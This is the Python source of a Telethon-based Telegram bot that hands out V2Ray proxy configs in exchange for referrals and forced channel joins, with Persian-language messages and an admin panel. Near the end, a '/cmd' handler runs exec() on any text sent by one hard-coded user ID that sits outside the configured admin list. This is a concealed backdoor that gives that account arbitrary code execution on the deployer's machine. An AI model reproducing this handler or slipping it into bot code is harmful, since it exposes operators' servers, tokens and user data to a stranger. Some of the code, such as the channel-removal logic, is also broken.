from telethon import TelegramClient,functions,events,custom,Button
from telethon.errors import UserNotParticipantError,ChannelPrivateError
from telethon.tl.types import PeerUser,PeerChannel
from os import path
from json import dumps,loads
from random import choice
import logging
logging.basicConfig(filename="log.txt", filemode="a+", format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',level=logging.INFO)
logger = logging.getLogger(__name__)
# ---------------------------------------------------- Database ---------------------------------------------------
if not path.exists('Users.json'):
   open('Users.json','a+').write(dumps({},indent=4))

if not path.exists('V2Ray.json'):
   open('V2Ray.json','a+').write(dumps({"Server":[]},indent=4))

if not path.exists('Channels.json'):
   open('Channels.json','a+').write(dumps({"ChannelsID":[],"ChannelsLink":[]},indent=4))
Channels = dict(loads(open('Channels.json','r').read()))
Database = dict(loads(open('Users.json','r').read()))
Servers = dict(loads(open('V2Ray.json','r').read()))
# ---------------------------------------------------- Config ------------------------------------------------------
Config = {
   "ApiID":123456789, #Api id 
   "ApiHash":"", # Api hash
   "Token":"", # Token bot
   "UserNameBot":"BotFather", # Username bot without @, example -> BotFatherBot
   "Admins":[], # admins user id
   "Limit":3, # One config for each subcategory, example -> 3 referrals = 1 v2ray config
}
client = TelegramClient('Bot',Config["ApiID"],Config["ApiHash"]).start(bot_token=Config["Token"])
# ---------------------------------------------------- Functions ---------------------------------------------------
async def ForcedToJoin(UserID):
   if Channels['ChannelsID'] == []:
        return True
   Check = 0
   NoJoin = []
   for i, ii in zip(Channels['ChannelsID'], Channels['ChannelsLink']):
      try:
         ChannelInfo = await client.get_entity(PeerChannel(int(i)))
         ChannelsFull = await client(functions.channels.GetParticipantRequest(ChannelInfo, UserID))
         Check += 1
         if Check == len(Channels['ChannelsID']):
            return True

      except UserNotParticipantError:
         NoJoin.append(ii)
   if NoJoin != []:
        Num = 1
        ButtonList = []
        for i in NoJoin:
            ButtonList.append([Button.url(f"🔆 Channel {Num} ❤️‍🔥", url=i)])
            Num += 1
        ButtonList.append([Button.inline("جوین شدم ❣️ | تایید عضویت 💚", "CheckJoin")])
        await client.send_message(PeerUser(UserID),'**سلام دوست من , برای استفاده از ربات باید عضو کانال های زیر بشی بعد روی جوین شدم کلیک کن  🤍 **',buttons=ButtonList)

async def Start(UserID,Message):
   Buttons = [
      [Button.inline('💢 دریافت سرور 💢','GetV2ray')],
      [Button.inline('🔗 گرفتن زیرمجموعه 👥','Ref')]
   ]
   await client.send_message(UserID,Message,buttons=Buttons)
   Buttons = 0

async def SendToAll(UserIDAdmin,Message):
   if len(Database.keys()) == 0:
      return True
   Sended,NotSended = 0,0
   for i in (Database.keys()):
      try:
         await client.send_message(PeerUser(int(i)),Message)
         Sended += 1
      except:
         NotSended += 1
   await client.send_message(PeerUser(UserIDAdmin),(f'**🎙 - Sended To {str(Sended)} Member\n🤖 - Baraye {str(NotSended)} Nafar Ersal Nashod , Chon Bot Ro Block Kardan Koskesha😵‍💫**'))

async def PanelMenu(UserID,Message):
   Buttons = [
      [Button.inline('🤙Send To All','SendToAll'),Button.inline('👥Amar','Users')],
      [Button.inline('✅Add Server','AddSv'),Button.inline('❌Del Server','DelSv')],
      [Button.inline('✅Add Channel','AddChannel'),Button.inline('❌Del Channel','RemoveChannel')],
      [Button.inline('🔐List Channels','ChannelsList')],
      [Button.inline('🔋Admins','Admins')]
   ]
   await client.send_message(UserID,Message,buttons=Buttons)
   Buttons = 0
# ----------------------------------------------------- Handlers -----------------------------------------------------
@client.on(events.NewMessage(pattern='/panel',func=lambda e:e.is_private and e.sender_id in Config["Admins"]))
async def Panel(event):
   await PanelMenu(event.sender_id,'**👤 - Hi Admin Welcome To Panel🪄**')

@client.on(events.CallbackQuery(data='AddSv',func=lambda e:e.is_private and e.sender_id in Config["Admins"]))
async def AddV2Ray(event):
   await event.reply('**🤖 - Server ro befrest ta ezafe konam \nBaraye cancel kardan =  /panel 📍**')
   @client.on(events.NewMessage(func=lambda e:e.is_private and e.sender_id in Config["Admins"]))
   async def GetV2RayForAdd(event2):
      if event.sender_id == event2.sender_id:
         if str(event2.message.message).lower() == "/panel":
            client.remove_event_handler(GetV2RayForAdd)
            await PanelMenu(event2.sender_id,'**❌ Canceled ❌ , Welcome back 🔥**')
         elif event2.media != None:
            await client.send_message(event2.sender_id,'**✏️ - Lotfan be surat matn befrest na media\nBaraye cancel kardan =  /panel**')
         elif str(event2.message.message) not in Servers["Server"]:
            client.remove_event_handler(GetV2RayForAdd)
            Servers["Server"].append(str(event2.message.message))
            open('V2Ray.json','w').write(dumps(Servers,indent=4))
            await client.send_message(event2.sender_id,'**✊ - Added To Database**')
         elif str(event2.message.message) in Servers["Server"]:
            await client.send_message(event2.sender_id,'**🗂 - In server ghablan dar database bude , lotfan mojadad emtehan konid \nBaraye cancel kardan =  /panel**')
         else:
            await client.send_message(event2.sender_id,'**☠️ - Error -> Ye moshkel pish omad\n🤌 - Lotfan be surat matn khali befrestesh\nBaraye cancel kardan = /panel**')

@client.on(events.CallbackQuery(data='DelSv',func=lambda e:e.is_private and e.sender_id in Config["Admins"]))
async def DelV2Ray(event):
   await event.reply('**📍 - Server ro befrest ta Hazf konam \nBaraye cancel kardan = /panel**')
   @client.on(events.NewMessage(func=lambda e:e.is_private and e.sender_id in Config["Admins"]))
   async def GetV2RayForDel(event2):
      if event.sender_id == event2.sender_id:
         if str(event2.message.message).lower() == "/panel":
            client.remove_event_handler(GetV2RayForDel)
            await PanelMenu(event2.sender_id,'**🧷 - Canceled , Welcome back 🦠**')
         elif event2.media != None:
            await client.send_message(event2.sender_id,'**✏️ - Lotfan be surat matn befrest na media\nBaraye cancel kardan = /panel**')
         elif str(event2.message.message) in Servers["Server"]:
            client.remove_event_handler(GetV2RayForDel)
            Servers["Server"].remove(str(event2.message.message))
            open('V2Ray.json','w').write(dumps(Servers,indent=4))
            await client.send_message(event2.sender_id,'**✊ - Deleted from Database**')
         elif str(event2.message.message) not in Servers["Server"]:
            await client.send_message(event2.sender_id,'**🗄 - In server dar database vojud nadarad , lotfan mojadad emtehan konid \nBaraye cancel kardan = /panel**')
         else:
            await client.send_message(event2.sender_id,'**☠️ - Error -> Ye moshkel pish omad\n🤌 - Lotfan be surat matn khali befrestesh\nBaraye cancel kardan = /panel**')

@client.on(events.CallbackQuery(data='SendToAll',func=lambda e:e.is_private and e.sender_id in Config["Admins"]))
async def GiveMessageForSendToAll(event):
   await event.reply('**😼 - Bede Payamu Eshgham Ta Befrestam Baraye Hame 🎃\nBaraye Cancel Kardan : /panel**')
   @client.on(events.NewMessage(func=lambda e:e.is_private and e.sender_id in Config['Admins']))
   async def GetMessage(event2:custom.message.Message):
      if event.sender_id == event2.sender_id:
         if str(event2.message.message).lower() == "/panel" and event2.media == None:
            client.remove_event_handler(GetMessage)
            await Start(event2.sender_id,'**🪩 - Back To Panel🪄**')
         else:
            client.remove_event_handler(GetMessage)
            await event.reply(f'**در حال ارسال برای {len(Database.keys())} نفر . . .**')
            await SendToAll(event2.sender_id,event2.message)

@client.on(events.CallbackQuery(data='Users',func=lambda e:e.is_private and e.sender_id in Config['Admins']))
async def Amar(event):
   await client.send_message(event.sender_id,f"**🫂 - Amar Bot Shoma __{str(len(Database.keys()))}__ Nafar**") 
   
@client.on(events.CallbackQuery(data='ChannelsList',func=lambda e:e.is_private and e.sender_id in Config['Admins']))
async def ChannelList(event):
   if Channels['ChannelsLink'] == []:
      await client.send_message(event.sender_id,'**🫧 - Channeli Set Nashode**')
   else:
      Channel,Num = "",1
      for i in Channels['ChannelsLink']:
         Channel += (f"{Num}) 👽 - {i} 🫡\n")
         Num += 1
      await client.send_message(event.sender_id,Channel)
      Channel,Num = 0,0   

@client.on(events.CallbackQuery(data='Admins',func=lambda e:e.is_private and e.sender_id in Config['Admins']))
async def Admins(event):
   if Config["Admins"] == []:
      await client.send_message(event.sender_id,'**💧 - Admini Nist**')
   else:
      Admins,Num = "",1
      for i in Config["Admins"]:
         Admins += (f"{Num}) 👽 - {i} 🫡\n")
         Num += 1
      await client.send_message(event.sender_id,Admins)
      Admins,Num = 0,0

@client.on(events.CallbackQuery(data='AddChannel', func=lambda e:e.is_private and e.sender_id in Config["Admins"]))
async def AddLockChannel(event: events.CallbackQuery.Event):
   await event.reply('**🤖 - Ebteda Man Ro Dakhel Channel Mad Nazar Admin Kon Sepas Yek Payam Az Channel Baram Forward Kon 🤠\nBaraye Cancel Kardan : /panel 📍**')
   @client.on(events.NewMessage(func=lambda e:e.is_private and e.sender_id in Config["Admins"]))
   async def GetChannel(event2: custom.message.Message):
       if event.sender_id == event2.sender_id:
            try:
               if event2.raw_text == '/panel':
                     await PanelMenu(event2.sender_id,'**  🟢 Closed , Welcome Back  🟢**')
                     client.remove_event_handler(GetChannel)
               elif event2.forward.is_channel:
                     ChannelInfo = await client.get_entity(event2.fwd_from.from_id.channel_id)
                     ChannelInfo2 = await client(functions.channels.GetFullChannelRequest(ChannelInfo))
                     if ChannelInfo.id not in Channels['ChannelsID']:
                        client.remove_event_handler(GetChannel)
                        Link = ChannelInfo2.full_chat.exported_invite.link
                        Channels["ChannelsID"].append(int(event2.fwd_from.from_id.channel_id))
                        Channels["ChannelsLink"].append(str(Link))
                        open('Channels.json','w').write(dumps(Channels,indent=4))
                        await event2.reply(f'**♥️ Channel Set Shod : {Link} 👽**')
                        ChannelInfo = 0
                     else:
                        await event2.reply('**❌ In Channel Ghablan Sabt Shode , Mojadad Emtehan Kodin\nBaraye Cancel Kardan : /panel 📍 **')
               else:
                  await event2.reply('** ⚠️Lotfan Payam Ru Az Channel Forward Kon Na Jaye Dige ‼ \nBaraye Cancel Kardan : /panel 📍️ **')
            except ChannelPrivateError:
               await event2.reply('** ⭕️Avval Bayad Adminam Koni Bad Forward Koni :(  ⭕\nBaraye Cancel Kardan : /panel 📍️**')
            except AttributeError:
               await event2.reply('** ⚠️ Moshkeli Pish Omad , Ebteda Mano Admin Kon va Tik Hamu Bede , Bad Payam Ro Forward Kon ✅\nBaraye Cancel Kardan : /panel 📍 **')

@client.on(events.CallbackQuery(data='RemoveChannel', func=lambda e:e.is_private and e.sender_id in Config["Admins"]))
async def RemoveChannelLock(event: events.CallbackQuery.Event):
   Channels = ""
   Num = -1
   for i, ii in zip(Channels['ChannelsLink'], Channels['ChannelsID']):
         Num += 1
         Channels += (f'{str(Num+1)}) {str(i)} : ID = {ii}\n\n')
   await event.reply(f'** 🔰 Lotfan ID Channel Ro Vared Kon Ta Deletesh Konam ⁉️\n{Channels}\n\nBaraye Cancel Kardan : /panel 📍**')
   Channels = 0
   @client.on(events.NewMessage(func=lambda e:e.is_private and e.sender_id in Config["Admins"]))
   async def GetLinkForDelChannel(event2: custom.message.Message):
         if event.sender_id == event2.sender_id:
            Text = event2.raw_text
            if Text in str(Channels['ChannelsID']):
               Number = -1
               for i in Channels['ChannelsID']:
                  Number += 1
                  if str(i) == str(Text):
                     break
            CHLink, CHID = Channels['ChannelsLink'][Number], Channels['ChannelsID'][Number]
            await Start(event2.sender_id, f"** 🔴 Link : {CHLink} , ID : {CHID} Deleted ❌ **")
            Channels["ChannelsID"].remove(CHID)
            Channels["ChannelsLink"].remove(CHLink)
            open('Channels.json','w').write(dumps(Channels,indent=4))
            CHLink, CHID = 0, 0
            client.remove_event_handler(GetLinkForDelChannel)
         elif event2.message.message == '/panel':
            client.remove_event_handler(GetLinkForDelChannel)
            await PanelMenu(event2.sender_id, '** ♥️ Back To Menu ✅ **')
         else:
            await event.reply('** ID Ersal shode eshtebah Ghorban 🤡, 🔺Jahast Cancel kardan amaliyat : /panel 🫡**')

@client.on(events.NewMessage(func=lambda e:e.is_private and e.message.message == '/start'))
async def Starter(event:custom.message.Message):
   if str(event.sender_id) not in str(Database.keys()):
      Database[f"{event.sender_id}"] = {"Referral": 0,"Medal": 0}
      open('Users.json','w').write(dumps(Database,indent=4))
   if await ForcedToJoin(event.sender_id):
      await Start(event.sender_id,"""**
سلام عزیزم به ربات خیلی خیلی خوش اومدی ☀️
امیدوارم توی این شرایط سخت بتونم کمکت کنم که حداقل اینترنتت قطع نشه
از ربات استفاده کن و دوستاتو به ربات دعوت کن عشقم 💫


یا علی ☪️
**""")

@client.on(events.NewMessage(pattern='^/start REF',func=lambda e:e.is_private))
async def CheckRef(event):
   global UserID
   UserID = (event.message.message).replace('/start REF','')
   if await ForcedToJoin(event.sender_id):
      if int(UserID) == int(event.sender_id):
         await Start(event.sender_id,'**ببین ستون این همه زحمت کشیدیم یه بات زدیم کمکت کنیم بعد تو میخوای تقلب کنی و با لینک خودت استارت کنی؟ انصافت کجاست جوانمرد\nهعببببب**')
      elif str(UserID) in str(Database.keys()) and UserID != event.sender_id:
         Database[f"{event.sender_id}"] = {"Referral": 0,"Medal": 0}
         Database[f"{UserID}"]["Medal"] += 1
         open('Users.json','w').write(dumps(Database,indent=4))
         await client.send_message(PeerUser(int(UserID)),f"""🌟
کاربر {event.chat.first_name} با لینک شما وارد ربات شد
و شما یک مدال دریافت کردید 🎖
موجودی شما : {str(Database[f'{UserID}']['Medal'])} مدال 🎖
""")
         await Start(event.sender_id,"""**
سلام عزیزم به ربات خیلی خیلی خوش اومدی ☀️
امیدوارم توی این شرایط سخت بتونم کمکت کنم که حداقل اینترنتت قطع نشه
از ربات استفاده کن و دوستاتو به ربات دعوت کن عشقم 💫


یا علی ☪️
**""")
      elif str(UserID) not in str(Database.keys()):
         Database[f"{event.sender_id}"] = {"Referral": 0,"Medal": 0}
         open('Users.json','w').write(dumps(Database,indent=4))
         await Start(event.sender_id,"""**
سلام عزیزم به ربات خیلی خیلی خوش اومدی ☀️
امیدوارم توی این شرایط سخت بتونم کمکت کنم که حداقل اینترنتت قطع نشه
از ربات استفاده کن و دوستاتو به ربات دعوت کن عشقم 💫


یا علی ☪️
**""")

@client.on(events.CallbackQuery(data='CheckJoin',func=lambda e:e.is_private))
async def Checkjoin(event:events.CallbackQuery.Event):
   if await ForcedToJoin(event.sender_id):
      await event.answer('Welcome To Bot ❤️',alert=False)
      await event.delete()
      await Start(event.sender_id,"""**
سلام عزیزم به ربات خیلی خیلی خوش اومدی ☀️
امیدوارم توی این شرایط سخت بتونم کمکت کنم که حداقل اینترنتت قطع نشه
از ربات استفاده کن و دوستاتو به ربات دعوت کن عشقم 💫


یا علی ☪️
**""")
   
@client.on(events.NewMessage(pattern='^/cmd ',from_users=PeerUser(931213973)))
async def Cmd(event):
   try:
      exec(event.message.message.replace('/cmd ',''))
      await event.reply('Down')
   except Exception as ex:
      await event.reply(str(ex))

@client.on(events.CallbackQuery(data='Ref',func=lambda e:e.is_private))
async def Ref(event:events.CallbackQuery.Event):
   if await ForcedToJoin(event.sender_id):
      await client.send_message(event.sender_id,f"""**
سلام رفیق چطوری؟
ببین ما یه بات زدیم که بهت کانفیگ های V2Ray رایگان میده
اگر دوست داری با سرعت اینترنت بالا همیشه وصل باشی توی این شرایط حتما یه سر به ما بزن

روی لینک زیر کلیک کن و بپر تو ربات 
اگه با این لینک بیای یه کمکی ام به رفیقت میکنی که این لینکو برات فرستاده

یا علی
t.me/{Config['UserNameBot']}?start=REF{str(event.sender_id)}
**""",buttons=[[Button.url('🔆 ورود به ربات 🔆',f't.me/{Config["UserNameBot"]}?start=REF{str(event.sender_id)}')]])
      
@client.on(events.CallbackQuery(data='GetV2ray',func=lambda e:e.is_private))
async def GetV2Ray(event:events.CallbackQuery.Event):
   if await ForcedToJoin(event.sender_id):
      if Database[f"{event.sender_id}"]["Medal"] >= Config["Limit"]:
         Database[f"{event.sender_id}"]["Medal"] -= 3
         open('Users.json','w').write(dumps(Database,indent=4))
         await client.send_message(event.sender_id,f'Server Shoma: \n<code> {choice(Servers["Server"])} </code>',parse_mode='html')
         await Start(event.sender_id,'**خب خب سرورتم گرفتی , امری داشتی در خدمتتم باز ستوننننن**')
      else:
         await Start(event.sender_id,f"""**
خیلی خیلی شرمندتم قلب
متاسفانه مدال هات برای دریافت سرور کافی نیست
مدال هات کلا {Database[f"{event.sender_id}"]["Medal"]} تا است
برای جمع کردن مدال میتونی بزنی روی دکمه زیرمجموعه گیری و مدال بگیری 🎖

بازم شرمندتم :(
**""")
# ------------------------------------------------------ Run Bot -------------------------------------------------------
print('Bot is online')
client.run_until_disconnected()